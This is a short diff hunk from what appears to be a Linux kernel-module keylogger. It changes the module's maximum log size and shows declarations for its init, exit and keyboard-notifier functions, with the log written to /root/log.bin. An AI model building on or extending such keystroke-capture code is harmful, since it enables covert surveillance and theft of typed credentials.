@@ -14,7 +14,7 @@
 #include <linux/time.h>
 
 #define LOG_FILE_PATH "/root/log.bin"
-#define LOG_MAX_SIZE 1048576
+#define LOG_MAX_SIZE 10000 //in symbols
 void keylogger_exit(void);
 int keylogger_init(void);
 int kbd_notifier(struct notifier_block* nblock, unsigned long code, void* param);
